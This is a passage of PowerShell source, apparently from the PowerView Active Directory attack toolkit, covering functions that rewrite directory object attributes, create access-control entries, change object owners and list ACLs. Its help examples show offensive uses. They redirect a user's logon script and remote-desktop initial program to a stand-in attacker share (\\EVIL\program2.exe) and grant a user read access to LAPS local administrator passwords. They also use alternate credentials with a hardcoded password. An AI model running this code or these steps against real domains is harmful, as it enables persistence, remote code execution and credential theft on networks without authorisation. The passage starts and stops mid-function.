VERBOSE: Setting mstsinitialprogram to \\EVIL\program.exe for object testuser

.EXAMPLE

"S-1-5-21-890171859-3433809279-3366196753-1108","testuser" | Set-DomainObject -Set @{'countrycode'=1234; 'mstsinitialprogram'='\\EVIL\program2.exe'} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string:
(&(|(objectsid=S-1-5-21-890171859-3433809279-3366196753-1108)))
VERBOSE: Setting mstsinitialprogram to \\EVIL\program2.exe for object harmj0y
VERBOSE: Setting countrycode to 1234 for object harmj0y
VERBOSE: Get-DomainSearcher search string:
LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
VERBOSE: Setting mstsinitialprogram to \\EVIL\program2.exe for object testuser
VERBOSE: Setting countrycode to 1234 for object testuser

.EXAMPLE

"S-1-5-21-890171859-3433809279-3366196753-1108","testuser" | Set-DomainObject -Clear department -Verbose

Cleares the 'department' field for both object identities.

.EXAMPLE

Get-DomainUser testuser | ConvertFrom-UACValue -Verbose

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512


Set-DomainObject -Identity testuser -XOR @{useraccountcontrol=65536} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
VERBOSE: XORing 'useraccountcontrol' with '65536' for object 'testuser'

Get-DomainUser testuser | ConvertFrom-UACValue -Verbose

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

.EXAMPLE

Get-DomainUser -Identity testuser -Properties scriptpath

scriptpath
----------
\\primary\sysvol\blah.ps1

$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Set-DomainObject -Identity testuser -Set @{'scriptpath'='\\EVIL\program2.exe'} -Credential $Cred -Verbose
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=testuser)(name=testuser))))
VERBOSE: [Set-DomainObject] Setting 'scriptpath' to '\\EVIL\program2.exe' for object 'testuser'

Get-DomainUser -Identity testuser -Properties scriptpath

scriptpath
----------
\\EVIL\program2.exe
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{'Raw' = $True}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        # splat the appropriate arguments to Get-DomainObject
        $RawObject = Get-DomainObject @SearcherArguments

        ForEach ($Object in $RawObject) {

            $Entry = $RawObject.GetDirectoryEntry()

            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)'"
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['XOR']) {
                try {
                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                        $PropertyName = $_.Name
                        $PropertyXorValue = $_.Value
                        Write-Verbose "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)'"
                        $TypeName = $Entry.$PropertyName[0].GetType().name

                        # UAC value references- https://support.microsoft.com/en-us/kb/305144
                        $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue
                        $Entry.$PropertyName = $PropertyValue -as $TypeName
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['Clear']) {
                try {
                    $PSBoundParameters['Clear'] | ForEach-Object {
                        $PropertyName = $_
                        Write-Verbose "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)'"
                        $Entry.$PropertyName.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}


function ConvertFrom-LDAPLogonHours {
<#
.SYNOPSIS

Converts the LDAP LogonHours array to a processible object.

Author: Lee Christensen (@tifkin_)  
License: BSD 3-Clause  
Required Dependencies: None

.DESCRIPTION

Converts the LDAP LogonHours array to a processible object.  Each entry
property in the output object corresponds to a day of the week and hour during
the day (in UTC) indicating whether or not the user can logon at the specified
hour.

.PARAMETER LogonHoursArray

21-byte LDAP hours array.

.EXAMPLE

$hours = (Get-DomainUser -LDAPFilter 'userworkstations=*')[0].logonhours
ConvertFrom-LDAPLogonHours $hours

Gets the logonhours array from the first AD user with logon restrictions.

.OUTPUTS

PowerView.LogonHours
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $LogonHoursArray
    )

    Begin {
        if($LogonHoursArray.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }

        function ConvertTo-LogonHoursArray {
            Param (
                [int[]]
                $HoursArr
            )

            $LogonHours = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $HoursArr[$i]
                $Offset = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')

                $LogonHours[$Offset+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $LogonHours[$Offset+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $LogonHours[$Offset+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $LogonHours[$Offset+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $LogonHours[$Offset+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $LogonHours[$Offset+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $LogonHours[$Offset+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $LogonHours[$Offset+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }

            $LogonHours
        }
    }

    Process {
        $Output = @{
            Sunday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[0..2]
            Monday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[3..5]
            Tuesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[6..8]
            Wednesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[9..11]
            Thurs = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[12..14]
            Friday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[15..17]
            Saturday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[18..20]
        }

        $Output = New-Object PSObject -Property $Output
        $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        $Output
    }
}


function New-ADObjectAccessControlEntry {
<#
.SYNOPSIS

Creates a new Active Directory object-specific access control entry.

Author: Lee Christensen (@tifkin_)  
License: BSD 3-Clause  
Required Dependencies: None

.DESCRIPTION

Creates a new object-specific access control entry (ACE).  The ACE could be 
used for auditing access to an object or controlling access to objects.

.PARAMETER PrincipalIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain principal to add for the ACL. Required. Wildcards accepted.

.PARAMETER PrincipalDomain

Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.

.PARAMETER PrincipalSearchBase

The LDAP source to search through for principals, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Right

Specifies the rights set on the Active Directory object.

.PARAMETER AccessControlType

Specifies the type of ACE (allow or deny)

.PARAMETER AuditFlag

For audit ACEs, specifies when to create an audit log (on success or failure)

.PARAMETER ObjectType

Specifies the GUID of the object that the ACE applies to.

.PARAMETER InheritanceType

Specifies how the ACE applies to the object and/or its children.

.PARAMETER InheritedObjectType

Specifies the type of object that can inherit the ACE.

.EXAMPLE

$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()

Adds an ACE to all computer objects in the OU "Workstations" permitting the
user "itadmin" to read the confidential ms-Mcs-AdmPwd computer property.

.OUTPUTS

System.Security.AccessControl.AuthorizationRule
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,

        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $AccessControlType,

        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $AuditFlag,

        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $ObjectType,

        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $InheritanceType,

        [Guid]
        $InheritedObjectType
    )

    Begin {
        if ($PrincipalIdentity -notmatch '^S-1-.*') {
            $PrincipalSearcherArguments = @{
                'Identity' = $PrincipalIdentity
                'Properties' = 'distinguishedname,objectsid'
            }
            if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
            if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
            $Principal = Get-DomainObject @PrincipalSearcherArguments
            if (-not $Principal) {
                throw "Unable to resolve principal: $PrincipalIdentity"
            }
            elseif($Principal.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            $ObjectSid = $Principal.objectsid
        }
        else {
            $ObjectSid = $PrincipalIdentity
        }

        $ADRight = 0
        foreach($r in $Right) {
            $ADRight = $ADRight -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $ADRight = [System.DirectoryServices.ActiveDirectoryRights]$ADRight

        $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$ObjectSid)
    }

    Process {
        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {

            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
        else {

            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
    }
}


function Set-DomainObjectOwner {
<#
.SYNOPSIS

Modifies the owner for a specified active directory object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

Retrieves the Active Directory object specified by -Identity by splatting to
Get-DomainObject, returning the raw searchresult object. Retrieves the raw
directoryentry for the object, and sets the object owner to -OwnerIdentity.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
of the AD object to set the owner for.

.PARAMETER OwnerIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
of the owner to set for -Identity.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y

Set the owner of 'dfm' in the current domain to 'harmj0y'.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y -Credential $Cred

Set the owner of 'dfm' in the current domain to 'harmj0y' using the alternate credentials.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $OwnerIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $OwnerSid = Get-DomainObject @SearcherArguments -Identity $OwnerIdentity -Properties objectsid | Select-Object -ExpandProperty objectsid
        if ($OwnerSid) {
            $OwnerIdentityReference = [System.Security.Principal.SecurityIdentifier]$OwnerSid
        }
        else {
            Write-Warning "[Set-DomainObjectOwner] Error parsing owner identity '$OwnerIdentity'"
        }
    }

    PROCESS {
        if ($OwnerIdentityReference) {
            $SearcherArguments['Raw'] = $True
            $SearcherArguments['Identity'] = $Identity

            # splat the appropriate arguments to Get-DomainObject
            $RawObject = Get-DomainObject @SearcherArguments

            ForEach ($Object in $RawObject) {
                try {
                    Write-Verbose "[Set-DomainObjectOwner] Attempting to set the owner for '$Identity' to '$OwnerIdentity'"
                    $Entry = $RawObject.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = 'Owner'
                    $Entry.PsBase.ObjectSecurity.SetOwner($OwnerIdentityReference)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning "[Set-DomainObjectOwner] Error setting owner: $_"
                }
            }
        }
    }
}


function Get-DomainObjectAcl {
<#
.SYNOPSIS

Returns the ACLs associated with a specific active directory object. By default
the DACL for the object(s) is returned, but the SACL can be returned with -Sacl.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainGUIDMap  

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Sacl

Switch. Return the SACL instead of the DACL for the object (default behavior).

.PARAMETER ResolveGUIDs

Switch. Resolve GUIDs to their display names.

.PARAMETER RightsFilter

A specific set of rights to return ('All', 'ResetPassword', 'WriteMembers').

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainObjectAcl -Identity matt.admin -domain testlab.local -ResolveGUIDs

Get the ACLs for the matt.admin user in the testlab.local domain and
resolve relevant GUIDs to their display names.

.EXAMPLE

Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs

Enumerate the ACL permissions for all OUs in the domain.

.EXAMPLE

Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs -Sacl

Enumerate the SACLs for all OUs in the domain, resolving GUIDs.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainObjectAcl -Credential $Cred -ResolveGUIDs

.OUTPUTS

PowerView.ACL

Custom PSObject with ACL entries.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Switch]
        $Sacl,

        [Switch]
        $ResolveGUIDs,

        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }

        if ($PSBoundParameters['Sacl']) {
            $SearcherArguments['SecurityMasks'] = 'Sacl'
        }
        else {
            $SearcherArguments['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $Searcher = Get-DomainSearcher @SearcherArguments

        $DomainGUIDMapArguments = @{}
        if ($PSBoundParameters['Domain']) { $DomainGUIDMapArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $DomainGUIDMapArguments['Server'] = $Server }
